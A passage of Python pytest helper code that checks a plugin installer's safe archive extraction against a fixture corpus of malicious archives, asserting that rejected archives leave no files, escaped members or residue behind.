CORPUS = Path(__file__).resolve().parent / "fixtures" / "malicious_archives"


def _load_builder():
    """Import the corpus generator by path — ``tests/fixtures`` is data, not a
    package, and making it one to satisfy an import would be the tail wagging
    the dog."""
    spec = importlib.util.spec_from_file_location(
        "_malicious_corpus_builder", CORPUS / "build_corpus.py"
    )
    assert spec and spec.loader
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    return mod


BUILDER = _load_builder()


def corpus(name: str) -> Path:
    p = CORPUS / name
    assert p.is_file(), f"missing corpus fixture {name}"
    return p


def snapshot(d: Path) -> set:
    """Everything under ``d``, with content, so "untouched" is a real claim and
    not just "the top-level listing looks the same"."""
    out = set()
    for p in sorted(d.rglob("*")):
        rel = p.relative_to(d).as_posix()
        if p.is_symlink():
            out.add((rel, "link", os.readlink(str(p))))
        elif p.is_dir():
            out.add((rel, "dir", ""))
        else:
            out.add((rel, "file", p.read_bytes().hex()))
    return out


def assert_rejected(archive: Path, tmp_path: Path, exc, reason: str, **kw) -> None:
    """The full refusal contract for one hostile archive."""
    parent = tmp_path / "store"
    parent.mkdir(exist_ok=True)
    (parent / "keepme.txt").write_text("prior state", encoding="utf-8")
    outside = tmp_path / "escaped.md"
    before = snapshot(parent)

    dest = parent / "python-pack-1.4.2"
    with pytest.raises(exc) as ei:
        safe_extract(archive, dest, **kw)

    assert ei.value.reason == reason, f"{archive.name}: {ei.value}"
    assert isinstance(ei.value, PluginError)
    assert not dest.exists(), "destination was created for a rejected archive"
    assert not outside.exists(), "a member escaped the extraction root"
    assert snapshot(parent) == before, "extraction left residue behind"


